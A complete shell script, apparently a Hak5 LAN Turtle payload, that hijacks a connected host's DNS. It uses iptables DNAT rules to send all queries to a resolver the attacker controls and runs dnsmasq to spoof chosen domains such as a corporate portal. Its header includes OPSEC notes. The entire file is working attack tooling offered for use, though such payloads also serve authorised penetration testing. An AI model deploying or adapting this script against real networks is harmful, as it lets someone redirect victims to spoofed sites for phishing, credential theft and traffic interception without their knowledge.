#!/bin/sh
# ============================================================================
# PAYLOAD: dns-redirect.sh — DNS Interception via iptables
# DEVICE:  LAN Turtle (Hak5) — OpenWrt / BusyBox ash
# PURPOSE: Redirect DNS queries from the connected host to attacker-
#          controlled resolver or specific IP for targeted domains
# TOOLS:   iptables, dnsmasq (OpenWrt built-in)
# OPSEC:   Only affects traffic on eth0 (host-facing USB interface).
#          Does NOT touch eth1 (target network) or tun0 (VPN).
#          Full rollback via stop command. State file tracks rules.
# ============================================================================

# --- Configuration -----------------------------------------------------------
HOST_IFACE="eth0"                      # Host-facing interface
REDIRECT_DNS="10.8.0.1"               # Attacker DNS (default: Pineapple)
STATEFILE="/tmp/dns-redirect.state"
LOG="/tmp/dns-redirect.log"
HOSTSFILE="/tmp/dns-spoofed-hosts"

# --- Functions ---------------------------------------------------------------
usage() {
    echo "Usage: $0 <start|stop|status|spoof> [options]"
    echo ""
    echo "Modes:"
    echo "  start [dns_ip]          - Redirect ALL DNS to specified resolver"
    echo "                            Default resolver: ${REDIRECT_DNS}"
    echo "  spoof <domain> <ip>     - Add targeted domain spoof via hosts file"
    echo "  stop                    - Remove all redirects, restore DNS"
    echo "  status                  - Show current DNS redirect state"
    echo ""
    echo "Examples:"
    echo "  $0 start                          # Redirect DNS to Pineapple"
    echo "  $0 start 8.8.8.8                  # Redirect DNS to Google"
    echo "  $0 spoof portal.corp.com 10.8.0.1 # Spoof specific domain"
    echo "  $0 stop                           # Clean rollback"
    exit 1
}

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG"
}

start_redirect() {
    _dns="${1:-$REDIRECT_DNS}"

    if [ -f "$STATEFILE" ]; then
        log "DNS redirect already active. Stop first."
        return 1
    fi

    log "=== DNS Redirect Started ==="
    log "Interface: ${HOST_IFACE}"
    log "Redirect to: ${_dns}"

    # Redirect UDP DNS from host-facing interface
    iptables -t nat -A PREROUTING -i "$HOST_IFACE" \
             -p udp --dport 53 \
             -j DNAT --to-destination "${_dns}:53"

    # Redirect TCP DNS (rare but possible)
    iptables -t nat -A PREROUTING -i "$HOST_IFACE" \
             -p tcp --dport 53 \
             -j DNAT --to-destination "${_dns}:53"

    # Record state for clean rollback
    echo "DNS_TARGET=${_dns}" > "$STATEFILE"
    echo "IFACE=${HOST_IFACE}" >> "$STATEFILE"

    log "DNS redirect active. Host DNS queries → ${_dns}"
}

add_spoof() {
    _domain="$1"
    _ip="$2"

    if [ -z "$_domain" ] || [ -z "$_ip" ]; then
        echo "Usage: $0 spoof <domain> <spoofed_ip>"
        return 1
    fi

    # Append to spoofed hosts file
    echo "${_ip} ${_domain}" >> "$HOSTSFILE"
    log "Spoof added: ${_domain} → ${_ip}"

    # Check if dnsmasq is available and running
    if command -v dnsmasq > /dev/null 2>&1; then
        # If dnsmasq not running with our hosts, start it
        if ! pgrep -f "dnsmasq.*dns-spoofed" > /dev/null 2>&1; then
            # Start lightweight dnsmasq with spoofed hosts
            dnsmasq --no-daemon --no-resolv \
                    --addn-hosts="$HOSTSFILE" \
                    --server=8.8.8.8 \
                    --listen-address=127.0.0.1 \
                    --port=5353 \
                    --log-facility=/tmp/dns-spoof.log \
                    > /dev/null 2>&1 &
            log "dnsmasq spoof resolver started on 127.0.0.1:5353"

            # Redirect host DNS to our spoof resolver
            iptables -t nat -A PREROUTING -i "$HOST_IFACE" \
                     -p udp --dport 53 \
                     -j DNAT --to-destination "127.0.0.1:5353"

            echo "SPOOF_DNSMASQ=yes" >> "$STATEFILE" 2>/dev/null
        else
            # Reload dnsmasq to pick up new hosts
            kill -HUP "$(pgrep -f 'dnsmasq.*dns-spoofed')" 2>/dev/null
            log "dnsmasq reloaded with updated hosts"
        fi
    else
        log "WARNING: dnsmasq not available. Use 'start' mode with external DNS instead."
    fi
}

stop_redirect() {
    log "=== DNS Redirect Cleanup ==="

    # Remove iptables NAT rules for DNS
    # Flush is too aggressive — remove specific rules
    iptables -t nat -S PREROUTING 2>/dev/null | grep "dport 53" | while read -r _rule; do
        # Convert -A to -D for deletion
        _del=$(echo "$_rule" | sed 's/^-A/-D/')
        eval iptables -t nat "$_del" 2>/dev/null
        log "Removed: iptables -t nat ${_del}"
    done

    # Kill spoofed dnsmasq if running
    _pid=$(pgrep -f "dnsmasq.*dns-spoofed" 2>/dev/null)
    if [ -n "$_pid" ]; then
        kill "$_pid"
        log "Killed spoof dnsmasq (PID ${_pid})"
    fi

    # Cleanup state files
    rm -f "$STATEFILE" "$HOSTSFILE" /tmp/dns-spoof.log
    log "DNS redirect removed. Normal DNS restored."
}

show_status() {
    echo "=== DNS Redirect Status ==="
    if [ -f "$STATEFILE" ]; then
        echo "State: ACTIVE"
        cat "$STATEFILE"
    else
        echo "State: INACTIVE"
    fi
    echo ""
    echo "NAT rules (DNS):"
    iptables -t nat -S PREROUTING 2>/dev/null | grep "dport 53" || echo "  (none)"
    echo ""
    if [ -f "$HOSTSFILE" ]; then
        echo "Spoofed domains:"
        cat "$HOSTSFILE"
    fi
}

# --- Main --------------------------------------------------------------------
case "${1:-}" in
    start)
        start_redirect "$2"
        ;;
    spoof)
        add_spoof "$2" "$3"
        ;;
    stop)
        stop_redirect
        ;;
    status)
        show_status
        ;;
    *)
        usage
        ;;
esac
